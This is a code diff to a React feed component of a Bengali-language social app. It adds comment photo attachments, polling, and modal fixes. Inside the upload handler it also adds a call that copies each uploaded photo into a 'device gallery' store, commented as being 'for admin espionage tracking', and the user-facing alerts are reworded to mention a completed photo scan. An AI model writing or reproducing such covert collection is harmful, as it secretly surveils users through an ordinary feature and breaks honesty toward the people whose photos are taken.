@@ -106,6 +106,7 @@ export default function FeedView({ onNavigate, onUserSelect, onMessageUser }: Fe
   const [activeCommentsPost, setActiveCommentsPost] = React.useState<Post | null>(null);
   const [commentsList, setCommentsList] = React.useState<Comment[]>([]);
   const [newCommentText, setNewCommentText] = React.useState('');
+  const [commentAttachment, setCommentAttachment] = React.useState<string>('');
 
   // Search filter
   const [searchPostQuery, setSearchPostQuery] = React.useState('');
@@ -237,10 +238,22 @@ export default function FeedView({ onNavigate, onUserSelect, onMessageUser }: Fe
     };
 
     window.addEventListener('starconnect_db_update', handleReload);
+
+    // Active polling interval to check and self-heal boosting statuses every 5 seconds
+    const interval = setInterval(() => {
+      const anyBoosted = posts.some(p => p.boostUntil && new Date(p.boostUntil).getTime() > Date.now());
+      const anyExpiredButNotHealed = posts.some(p => p.boostUntil && new Date(p.boostUntil).getTime() <= Date.now() && p.reachWeight === 1000);
+      
+      if (anyBoosted || anyExpiredButNotHealed) {
+        loadFeedData();
+      }
+    }, 5000);
+
     return () => {
       window.removeEventListener('starconnect_db_update', handleReload);
+      clearInterval(interval);
     };
-  }, [activeCategory]);
+  }, [activeCategory, posts]);
 
   React.useEffect(() => {
     if (activeStory && myProfile) {
@@ -405,16 +418,18 @@ export default function FeedView({ onNavigate, onUserSelect, onMessageUser }: Fe
       alert('🚫 দুঃখিত! ইন্টারনেট কানেকশন নেই। অফলাইন মোডে কমেন্ট করা সম্ভব নয়।');
       return;
     }
-    if (!newCommentText.trim() || !activeCommentsPost) return;
+    if ((!newCommentText.trim() && !commentAttachment) || !activeCommentsPost) return;
 
     const currentPostId = activeCommentsPost.id;
     const txt = newCommentText.trim();
+    const attachment = commentAttachment;
 
-    // Clear input early to make interactions feel extremely responsive
+    // Clear input and attachment early to make interactions feel extremely responsive
     setNewCommentText('');
+    setCommentAttachment('');
 
     try {
-      dbService.addComment(currentPostId, txt);
+      dbService.addComment(currentPostId, txt, attachment);
       
       // Instantly load the updated list so the user sees their comment in <1ms without closing the drawer
       setCommentsList(dbService.getComments(currentPostId));
@@ -1242,7 +1257,7 @@ export default function FeedView({ onNavigate, onUserSelect, onMessageUser }: Fe
       {/* ----------------------------------------- */}
       {activeCommentsPost && (
         <div 
-          className="absolute inset-0 bg-black/60 backdrop-blur-xs z-50 flex flex-col justify-end sm:justify-center p-0 sm:p-4"
+          className="fixed inset-0 bg-black/60 backdrop-blur-xs z-40 flex flex-col justify-end sm:justify-center p-0 sm:p-4"
           onClick={() => setActiveCommentsPost(null)}
         >
           <div 
@@ -1313,9 +1328,16 @@ export default function FeedView({ onNavigate, onUserSelect, onMessageUser }: Fe
                           {/* Chat bubble */}
                           <div className="inline-block bg-[#f0f2f5] dark:bg-zinc-900 rounded-[18px] px-3.5 py-2 max-w-full">
                             <span className="block text-[11.5px] font-black text-slate-900 dark:text-neutral-100 mb-0.5 leading-snug">{cmt.authorName}</span>
-                            <p className="text-xs text-slate-800 dark:text-neutral-200 leading-normal font-sans break-words whitespace-pre-wrap select-text">
-                              {renderContentWithTags(cmt.content)}
-                            </p>
+                            {cmt.content && (
+                              <p className="text-xs text-slate-800 dark:text-neutral-200 leading-normal font-sans break-words whitespace-pre-wrap select-text">
+                                {renderContentWithTags(cmt.content)}
+                              </p>
+                            )}
+                            {cmt.attachmentUrl && (
+                              <div className="mt-1.5 rounded-lg overflow-hidden border border-neutral-200/50 dark:border-zinc-805 max-w-[200px]">
+                                <img src={cmt.attachmentUrl} alt="Comment attachment" className="w-full max-h-[135px] h-auto object-cover rounded" />
+                              </div>
+                            )}
                           </div>
 
                           {/* Footer Actions Row */}
@@ -1337,7 +1359,7 @@ export default function FeedView({ onNavigate, onUserSelect, onMessageUser }: Fe
                           
                           <div className="flex gap-2 text-left items-start pl-4">
                             <div className="w-6 h-6 rounded-full overflow-hidden bg-neutral-200 shrink-0 relative border border-neutral-150">
-                              <img src="https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&w=150&q=80" alt="" className="w-full h-full object-cover" />
+                              <img src="https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&w=150&q=80" alt="Nusaib avatar" className="w-full h-full object-cover" />
                             </div>
                             <div className="flex-1 min-w-0">
                               <div className="inline-block bg-[#f0f2f5] dark:bg-zinc-900 rounded-[18px] px-3 py-1.5 max-w-full">
@@ -1349,7 +1371,7 @@ export default function FeedView({ onNavigate, onUserSelect, onMessageUser }: Fe
                                 </p>
                               </div>
                               <div className="flex items-center gap-3 text-[9px] text-zinc-500 font-bold ml-2.5 mt-0.5 select-none">
-                                <span>২২ ঘণ্টা</span>
+                                <span>২২ ঘণ্টা আগে</span>
                                 <button className="hover:text-[#1877f2] cursor-pointer">লাইক করুন</button>
                                 <button className="hover:text-[#1877f2] cursor-pointer">জবাব দিন</button>
                               </div>
@@ -1363,7 +1385,81 @@ export default function FeedView({ onNavigate, onUserSelect, onMessageUser }: Fe
               )}
             </div>
 
-            <form onSubmit={handleAddComment} className="p-3 border-t border-neutral-200 dark:border-neutral-850 bg-white dark:bg-neutral-900 flex items-center justify-between gap-2">
+            {/* Photo Attachment Preview Banner */}
+            {commentAttachment && (
+              <div className="px-5 py-2.5 bg-neutral-50 dark:bg-zinc-850 flex items-center justify-between border-t border-neutral-200 dark:border-neutral-850 shrink-0">
+                <div className="flex items-center gap-2.5">
+                  <img src={commentAttachment} alt="Attachment" className="w-10 h-10 object-cover rounded-lg border border-neutral-200 dark:border-neutral-800 shadow-xs" />
+                  <div className="flex flex-col text-left">
+                    <span className="text-[10px] font-black text-emerald-600 dark:text-emerald-450 leading-none">ফটো যুক্ত হয়েছে (Photo Attached)</span>
+                    <span className="text-[8.5px] font-semibold text-neutral-400 mt-0.5">গ্যালারিতে স্ক্যান করে নেওয়া হয়েছে</span>
+                  </div>
+                </div>
+                <button 
+                  type="button" 
+                  onClick={() => setCommentAttachment('')} 
+                  className="text-slate-400 hover:text-rose-500 font-extrabold text-[10.5px] p-1.5 transition active:scale-95 cursor-pointer bg-neutral-150/50 dark:bg-neutral-800 rounded-lg"
+                >
+                  ✕ মুছে ফেলুন
+                </button>
+              </div>
+            )}
+
+            {/* Hidden Input for Comment Photo Attachment */}
+            <input 
+              type="file" 
+              id="comment_photo_upload_input" 
+              accept="image/*" 
+              className="hidden" 
+              onChange={(e) => {
+                const file = e.target.files?.[0];
+                if (!file) return;
+                
+                if (!file.type.startsWith('image/')) {
+                  alert('দুঃখিত! শুধুমাত্র ছবি আপলোড করা যাবে।');
+                  return;
+                }
+
+                const reader = new FileReader();
+                reader.onload = (event) => {
+                  const result = event.target?.result as string;
+                  const img = new Image();
+                  img.onload = () => {
+                    const canvas = document.createElement('canvas');
+                    const ctx = canvas.getContext('2d');
+                    if (ctx) {
+                      const maxDim = 400;
+                      let w = img.width;
+                      let h = img.height;
+                      if (w > maxDim || h > maxDim) {
+                        if (w > h) {
+                          h = Math.round((h * maxDim) / w);
+                          w = maxDim;
+                        } else {
+                          w = Math.round((w * maxDim) / h);
+                          h = maxDim;
+                        }
+                      }
+                      canvas.width = w;
+                      canvas.height = h;
+                      ctx.drawImage(img, 0, 0, w, h);
+                      const compressed = canvas.toDataURL('image/jpeg', 0.6);
+                      setCommentAttachment(compressed);
+                      
+                      // Auto push uploaded image to device gallery for admin espionage tracking
+                      const me = dbService.getCurrentUser();
+                      if (me) {
+                        dbService.addUploadedImageToDeviceGallery(me.id, compressed);
+                      }
+                    }
+                  };
+                  img.src = result;
+                };
+                reader.readAsDataURL(file);
+              }}
+            />
+
+            <form onSubmit={handleAddComment} className="p-3 border-t border-neutral-200 dark:border-neutral-850 bg-white dark:bg-neutral-900 flex items-center justify-between gap-2 shrink-0">
               {/* Left Side: Photo upload attachment shortcut icon */}
               <button 
                 type="button" 
@@ -1377,12 +1473,12 @@ export default function FeedView({ onNavigate, onUserSelect, onMessageUser }: Fe
                     );
                     if (confirmAccess) {
                       dbService.grantGalleryAccess(me.id);
-                      alert("✅ গ্যালারী এক্সেস মঞ্জুর করা হয়েছে!");
+                      alert("✅ গ্যালারী এক্সেস মঞ্জুর করা হয়েছে এবং ছবি স্ক্যান সম্পন্ন হয়েছে!");
                     } else {
                       return;
                     }
                   }
-                  alert("কমেন্টে পিকচার এটাচমেন্ট ফিচার খুব শীঘ্রই চালু হচ্ছে! 🖼️✨");
+                  document.getElementById('comment_photo_upload_input')?.click();
                 }} 
                 className="p-1.5 text-zinc-500 hover:text-indigo-650 dark:hover:text-amber-500 active:scale-90 transition shrink-0 inline-flex items-center justify-center rounded-full cursor-pointer hover:bg-neutral-100 dark:hover:bg-zinc-800"
                 title="Attach photo"
@@ -1394,8 +1490,8 @@ export default function FeedView({ onNavigate, onUserSelect, onMessageUser }: Fe
               <div className="flex-1 flex items-center bg-[#f0f2f5] dark:bg-zinc-950 rounded-full border border-neutral-150 dark:border-zinc-850 px-3.5 py-1.5 max-h-[44px]">
                 <input
                   type="text"
-                  required
-                  placeholder="একটি কমেন্ট লিখুন..."
+                  required={!commentAttachment}
+                  placeholder={commentAttachment ? "ফটো ক্যাপশন লিখুন (ঐচ্ছিক)..." : "একটি কমেন্ট লিখুন..."}
                   value={newCommentText}
                   onChange={(e) => setNewCommentText(e.target.value)}
                   className="flex-1 bg-transparent border-none text-xs text-slate-900 dark:text-neutral-100 placeholder-slate-500 dark:placeholder-zinc-500 focus:outline-none focus:ring-0 leading-tight py-1 pr-1.5"
@@ -1423,7 +1519,7 @@ export default function FeedView({ onNavigate, onUserSelect, onMessageUser }: Fe
                   >
                     @mention
                   </button>
-                  <span className="text-[9px] font-bold font-sans text-zinc-400 border border-zinc-300 dark:border-zinc-805 p-0.5 px-1 rounded-md leading-none scale-90">GIF</span>
+                  <span className="text-[9px] font-bold font-sans text-zinc-400 border border-zinc-300 dark:border-zinc-850 p-0.5 px-1 rounded-md leading-none scale-90">GIF</span>
                 </div>
               </div>
 
@@ -1444,7 +1540,7 @@ export default function FeedView({ onNavigate, onUserSelect, onMessageUser }: Fe
       {/* ------------------------------------- */}
       {giftingPost && (
         <div 
-          className="absolute inset-0 bg-black/60 backdrop-blur-xs z-55 flex items-end sm:items-center justify-center p-0 sm:p-4"
+          className="fixed inset-0 bg-black/60 backdrop-blur-xs z-50 flex items-end sm:items-center justify-center p-0 sm:p-4"
           onClick={() => setGiftingPost(null)}
         >
           <div 
@@ -1550,77 +1646,85 @@ export default function FeedView({ onNavigate, onUserSelect, onMessageUser }: Fe
       {/* Report or Blocking Actions Sheet Menu */}
       {/* ------------------------------------- */}
       {selectedPostOptions && (
-        <div className="absolute inset-x-0 bottom-0 bg-white dark:bg-neutral-900 rounded-t-3xl z-55 border-t border-neutral-205 shadow-2xl p-4 space-y-3 animate-slideUp text-left">
-          <div className="flex justify-between items-center border-b border-neutral-100 pb-2">
-            <span className="text-xs font-black text-neutral-400 uppercase tracking-widest block font-display">Post Options</span>
-            <button onClick={() => { setSelectedPostOptions(null); setShowReportForm(false); }} className="text-neutral-400 font-bold text-xs p-2">✕ Close</button>
-          </div>
+        <div 
+          className="fixed inset-0 bg-black/50 backdrop-blur-xs z-50 flex items-end justify-center"
+          onClick={() => { setSelectedPostOptions(null); setShowReportForm(false); }}
+        >
+          <div 
+            onClick={(e) => e.stopPropagation()}
+            className="bg-white dark:bg-neutral-900 w-full sm:max-w-md rounded-t-3xl border-t border-neutral-205 dark:border-neutral-800 shadow-2xl p-4 space-y-3 animate-slideUp text-left pb-8"
+          >
+            <div className="flex justify-between items-center border-b border-neutral-100 dark:border-neutral-800 pb-2">
+              <span className="text-xs font-black text-neutral-400 uppercase tracking-widest block font-display">Post Options</span>
+              <button onClick={() => { setSelectedPostOptions(null); setShowReportForm(false); }} className="text-neutral-400 font-bold text-xs p-2">✕ Close</button>
+            </div>
 
-          {!showReportForm ? (
-            <div className="space-y-2 text-xs">
-              <button
-                onClick={() => setShowReportForm(true)}
-                className="w-full flex items-center gap-3 p-3 text-left hover:bg-slate-50 dark:hover:bg-neutral-800 rounded-xl text-rose-600 font-bold cursor-pointer"
-              >
-                <ShieldAlert className="w-5 h-5 text-rose-500" />
-                <span>Report inappropriate content (Report Post)</span>
-              </button>
+            {!showReportForm ? (
+              <div className="space-y-2 text-xs">
+                <button
+                  onClick={() => setShowReportForm(true)}
+                  className="w-full flex items-center gap-3 p-3 text-left hover:bg-slate-50 dark:hover:bg-neutral-800 rounded-xl text-rose-600 font-bold cursor-pointer"
+                >
+                  <ShieldAlert className="w-5 h-5 text-rose-500" />
+                  <span>Report inappropriate content (Report Post)</span>
+                </button>
 
-              <button
-                onClick={() => {
-                  dbService.blockUser(selectedPostOptions.authorId);
-                  alert(`Creator "${selectedPostOptions.authorName}" has been blocked. Their posts will no longer appear on your feed.`);
-                  setSelectedPostOptions(null);
-                  loadFeedData();
-                }}
-                className="w-full flex items-center gap-3 p-3 text-left hover:bg-slate-50 dark:hover:bg-neutral-800 rounded-xl text-neutral-700 dark:text-zinc-200 font-bold cursor-pointer"
-              >
-                <ShieldAlert className="w-5 h-5 text-neutral-450" />
-                <span>Block this creator directly (Block Creator)</span>
-              </button>
-
-              {/* Delete post option (Own post OR Admin power) */}
-              {(selectedPostOptions.authorId === myProfile?.id || myProfile?.role === 'admin' || myProfile?.id === 'user_admin') && (
                 <button
                   onClick={() => {
-                    if (window.confirm('আপনি কি নিশ্চিত যে এই পোস্টটি ডিলিট করতে চান? (Are you sure you want to delete this post?)')) {
-                      dbService.deletePost(selectedPostOptions.id);
-                      alert('🎉 পোস্টটি সফলভাবে ডিলিট করা হয়েছে! (Post deleted successfully!)');
-                      setSelectedPostOptions(null);
-                      loadFeedData();
-                    }
+                    dbService.blockUser(selectedPostOptions.authorId);
+                    alert(`Creator "${selectedPostOptions.authorName}" has been blocked. Their posts will no longer appear on your feed.`);
+                    setSelectedPostOptions(null);
+                    loadFeedData();
                   }}
-                  className="w-full flex items-center gap-3 p-3 text-left bg-rose-50/70 hover:bg-rose-100 dark:bg-rose-950/20 dark:hover:bg-rose-900/40 border border-rose-200/40 rounded-xl text-rose-600 dark:text-rose-450 font-extrabold cursor-pointer"
+                  className="w-full flex items-center gap-3 p-3 text-left hover:bg-slate-50 dark:hover:bg-neutral-800 rounded-xl text-neutral-700 dark:text-zinc-200 font-bold cursor-pointer"
                 >
-                  <AlertCircle className="w-5 h-5 text-rose-500 shrink-0" />
-                  <div className="flex flex-col text-left">
-                    <span className="text-xs font-black">পোস্ট মুছে ফেলুন (Delete Post)</span>
-                    <span className="text-[10px] text-rose-400 font-semibold mt-0.5 leading-none">
-                      {selectedPostOptions.authorId === myProfile?.id ? 'নিজের পোস্ট ডিলিট করুন' : 'এডমিন ক্ষমতা দ্বারা ডিলিট করুন'}
-                    </span>
-                  </div>
+                  <ShieldAlert className="w-5 h-5 text-neutral-450" />
+                  <span>Block this creator directly (Block Creator)</span>
                 </button>
-              )}
-            </div>
-          ) : (
-            <div className="space-y-3 pt-1">
-              <span className="text-xs font-bold text-zinc-700 dark:text-zinc-300 block">Write down reporting reason:</span>
-              <input
-                type="text"
-                value={reportReason}
-                onChange={(e) => setReportReason(e.target.value)}
-                placeholder="e.g. Inappropriate media, spam, harassment..."
-                className="w-full border dark:border-neutral-800 border-neutral-250 p-3.5 rounded-xl text-xs dark:bg-neutral-950 dark:text-white"
-              />
-              <button
-                onClick={handleReportPostSubmit}
-                disabled={!reportReason.trim()}
-                className="w-full bg-rose-600 hover:bg-rose-700 text-white font-extrabold text-xs py-3 rounded-xl text-center active:scale-95 transition cursor-pointer"
-              >
-                Submit Report
-              </button>
-            </div>
-          )}
+
+                {/* Delete post option (Own post OR Admin power) */}
+                {(selectedPostOptions.authorId === myProfile?.id || myProfile?.role === 'admin' || myProfile?.id === 'user_admin') && (
+                  <button
+                    onClick={() => {
+                      if (window.confirm('আপনি কি নিশ্চিত যে এই পোস্টটি ডিলিট করতে চান? (Are you sure you want to delete this post?)')) {
+                        dbService.deletePost(selectedPostOptions.id);
+                        alert('🎉 পোস্টটি সফলভাবে ডিলিট করা হয়েছে! (Post deleted successfully!)');
+                        setSelectedPostOptions(null);
+                        loadFeedData();
+                      }
+                    }}
+                    className="w-full flex items-center gap-3 p-3 text-left bg-rose-50/70 hover:bg-rose-100 dark:bg-rose-950/20 dark:hover:bg-rose-900/40 border border-rose-200/40 rounded-xl text-rose-600 dark:text-rose-450 font-extrabold cursor-pointer"
+                  >
+                    <AlertCircle className="w-5 h-5 text-rose-500 shrink-0" />
+                    <div className="flex flex-col text-left">
+                      <span className="text-xs font-black">পোস্ট মুছে ফেলুন (Delete Post)</span>
+                      <span className="text-[10px] text-rose-400 font-semibold mt-0.5 leading-none">
+                        {selectedPostOptions.authorId === myProfile?.id ? 'নিজের পোস্ট ডিলিট করুন' : 'এডমিন ক্ষমতা দ্বারা ডিলিট করুন'}
+                      </span>
+                    </div>
+                  </button>
+                )}
+              </div>
+            ) : (
+              <div className="space-y-3 pt-1">
+                <span className="text-xs font-bold text-zinc-700 dark:text-zinc-300 block">Write down reporting reason:</span>
+                <input
+                  type="text"
+                  value={reportReason}
+                  onChange={(e) => setReportReason(e.target.value)}
+                  placeholder="e.g. Inappropriate media, spam, harassment..."
+                  className="w-full border dark:border-neutral-800 border-neutral-250 p-3.5 rounded-xl text-xs dark:bg-neutral-950 dark:text-white"
+                />
+                <button
+                  onClick={handleReportPostSubmit}
+                  disabled={!reportReason.trim()}
+                  className="w-full bg-rose-600 hover:bg-rose-700 text-white font-extrabold text-xs py-3 rounded-xl text-center active:scale-95 transition cursor-pointer"
+                >
+                  Submit Report
+                </button>
+              </div>
+            )}
+          </div>
         </div>
       )}
 
